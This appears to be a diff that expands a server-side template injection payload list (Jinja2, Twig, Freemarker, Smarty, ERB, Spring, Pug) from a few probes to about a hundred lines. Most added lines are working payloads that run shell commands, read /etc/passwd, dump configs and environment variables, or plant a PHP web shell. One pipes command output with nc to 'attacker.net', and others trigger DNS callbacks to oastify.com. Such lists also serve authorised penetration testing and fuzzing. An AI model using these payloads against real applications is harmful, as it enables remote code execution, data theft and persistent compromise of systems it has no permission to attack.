@@ -1,11 +1,112 @@
-{{7*7}}
-${7*7}
-<%= 7*7 %>
-{{7*'7'}}
-{{config}}
-{{ ''.getClass().forName('java.lang.Runtime') }}
-{{ ''.__class__.__mro__[2].__subclasses__() }}
+#{ 7 * 7 }
 #{7*7}
-{% import os %}
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+${"freemarker.template.utility.Execute"?new()("id")}
+${"id".exec()}
+${"id".execute()}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
+${''.getClass().forName('java.lang.String')}
+${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''}
+${1/(0)}
+${7*7}
+${= _.VERSION}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(java.lang.System).getenv()}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${new java.lang.ProcessBuilder('id').start()}
+${new org.codehaus.groovy.runtime.MethodClosure("id","execute").call()}
+${{7*7}}
+*{7*7}
+- var x = root.process
+- x = x('child_process')
+- x = x.mainModule.require
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+<%= 7 * 7 %>
+<%= 7*7 %>
+<%= Dir.entries('/') %>
+<%= File.open('/etc/passwd').read %>
+<%= File.read("/etc/passwd") %>
+<%= IO.popen('ls /').readlines() %>
+<%= _.VERSION %>
+<%= `id` %>
+<%= `ls /` %>
+<%= system("id") %>
+<%=(`nslookup oastify.com`)%>
+= x.exec('id | nc attacker.net 80')
+@(7*7)
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex("id")}
+global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
+global.process.mainModule.require("child_process").execSync("id").toString()
+{$smarty.version}
 {${phpinfo()}}
+{% import os %}
+{% set x = ''.__class__.__mro__[1].__subclasses__() %}{{ x[40]('/etc/passwd').read() }}
+{%import os%}{{os.popen("id").read()}}
+{Smarty::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>")}
+{exec('id')}
+{if exec('id')}{/if}
+{if passthru('id')}{/if}
+{if system('id')}{/if}
+{passthru('id')}
+{php system('id');{/php}
+{php}echo `id`;{/php}
+{php}system('nslookup oastify.com');{/php}
+{shell_exec('id')}
+{system('id')}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ ''.getClass().forName('java.lang.Runtime') }}
+{{#with "s" as |string|}}
+{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['system']('id')}}
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{7*'7'}}
+{{7*7}}
+{{= _.VERSION}}
+{{['id','']|sort('exec')}}
+{{['id','']|sort('system')}}
+{{['id']|filter('exec')}}
+{{['id']|filter('passthru')}}
+{{['id']|filter('system')}}
+{{['id']|map('exec')}}
+{{['id']|map('system')}}
+{{['id']|reduce('exec')}}
+{{['id']|reduce('system')}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{app.request.server.all|join(',')}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].system('id')}}
+{{config.items()}}
+{{config}}
 {{constructor.constructor('return 1')()}}
+{{cycler.__init__.__globals__.os.popen("id").read()}}
+{{cycler}}
+{{dump(_context)}}
+{{dump(app)}}
+{{get_flashed_messages.__globals__['__builtins__']['__import__']('os').system('id')}}
+{{get_flashed_messages}}
+{{include("wp-config.php")}}
+{{joiner.__init__.__globals__.os.popen("id").read()}}
+{{joiner}}
+{{lipsum.__globals__.os.popen("id").read()}}
+{{lipsum.__globals__}}
+{{lipsum}}
+{{namespace.__init__.__globals__.os.popen("id").read()}}
+{{namespace}}
+{{range.constructor('global.process.mainModule.require("child_process").execSync("id").toString()')()}}
+{{request.application}}
+{{request['application'].__self__._get_data_for_json.__globals__['os'].popen('id').read()}}
+{{request['application'].__self__._get_data_for_json.__globals__['os'].system('id')}}
+{{request}}
+{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{self.template._module.__builtins__.__import__("os").popen("id").read()}}
+{{self}}
+{{this}}
+{{url_for.__globals__['__builtins__']['__import__']('os').system('id')}}
+{{url_for}}
+{{x.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{x.__init__.__globals__['__builtins__']['__import__']('os').system('id')}}
+{{x=Object}}
